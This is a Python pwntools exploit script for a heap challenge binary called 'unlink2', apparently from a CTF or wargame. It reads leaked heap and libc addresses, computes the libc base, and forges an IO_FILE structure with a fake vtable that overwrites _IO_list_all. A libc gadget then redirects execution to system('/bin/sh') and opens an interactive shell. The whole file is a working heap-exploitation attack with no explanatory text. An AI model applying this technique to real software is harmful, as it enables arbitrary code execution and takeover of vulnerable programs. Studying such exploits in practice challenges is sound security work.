#!/usr/bin/python
from pwn import *
from os import system

p = process ("/home/christmas1/unlink2")
#\p = process ("./unlink2")

context.log_level = 'error'
p.recvuntil ("heap (0x")
leak_heap = p.recvuntil ("address: 0x").split (", 0x")

heapA_addr = int (leak_heap[0][:12], 16)#0x555555757010
heapB_addr = int (leak_heap[1][:12], 16)#0x555555757030
heapC_addr = int (leak_heap[2][:12], 16)#0x555555757050

sysleak = p.recv(12)

system_off = 0x45380
iolistall_off = 0x00000000003c4520
libc_system = int (sysleak, 16)#p64 (0x7ffff7a53380)
libc_base = libc_system - system_off
#__free_hook = p64 (0x7ffff7dd37a8)
_io_list_all = libc_base + iolistall_off
iolistall = p64(_io_list_all)


link = p64(heapC_addr+0x20).replace ("\x00", "")
#print link.encode('hex')

target_off = 0x142dd4  # mov [rdi], rdi; call [rax+0x140]
jump_to = libc_base + target_off


vtable = "E"*8+"F"*8+"G"*8+"H"*8 # well, it's just buffer


IO_FILE = "/bin/sh\x00" * 2+ p64(0)*2 + p64(1) + p64(0)+ p64(1) + p64(1)*8 + p64(jump_to) + p64(1) * 2 + p64 (heapC_addr+0x30)*2 +p64(1) * 2 + p64 (heapC_addr+0x90) * 4  + p64 (libc_system) *30


pay = p64(jump_to) + p64(0xf31) + p64 (heapC_addr+32) + iolistall + "B"*16 + vtable + p64(heapC_addr+0x30) *2 + IO_FILE


p.sendline (pay)
p.recvuntil (" right?")
p.interactive ()

